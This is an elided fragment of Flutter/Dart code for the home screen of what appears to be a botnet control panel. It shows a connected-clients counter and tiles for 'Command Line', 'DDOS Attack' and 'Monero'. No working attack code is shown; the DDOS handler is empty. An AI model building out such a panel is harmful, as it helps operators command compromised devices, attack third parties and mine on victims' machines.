...
class _HomeScreenState extends State<HomeScreen> {
  ...
  void initState() {
    ...
    Future.delayed(const Duration(milliseconds: 200), () async {
      try {
        final response =
            await http.get(Uri.parse("http://localhost:8080/api/s/clients"));
      ...
      body: [
              ...
              Expanded(
                child: Column(
                  children: [
                    ...
                    Text(ConnectedClientsCount.toString(),
                        style: TextStyle(
        ...
        Container(
          decoration: BoxDecoration(
            ...
            //   image: AssetImage('assets/img/border.jpg'),
            //   opacity: 0.5,
            //   fit: BoxFit.cover,
            // ),
          ),
                ...
                children: [
                  Text("Tools",
                      ...
                      Padding(
                        ...
                        child: Text(
                            """Here you can control all connected devices with simple button presses to control the world. 
Nothing is impossible, even making money using money has become possible for both parties""",
                  ...
                  Wrap(
                    ...
                    children: [
                      PortfolioItem(
                        image: "assets/img/commad.jpg",
                        title: "Command Line",
                        onTap: () {
                          Navigator.pushNamed(
                              context, CommandLineScreen.router);
                        },
                      ),
                      PortfolioItem(
                        image: "assets/img/ddos.jpg",
                        title: "DDOS Attack",
                        onTap: () {},
                      ),
                      PortfolioItem(
                        image: "assets/img/monero.jpg",
                        title: "Monero",
                        onTap: () {
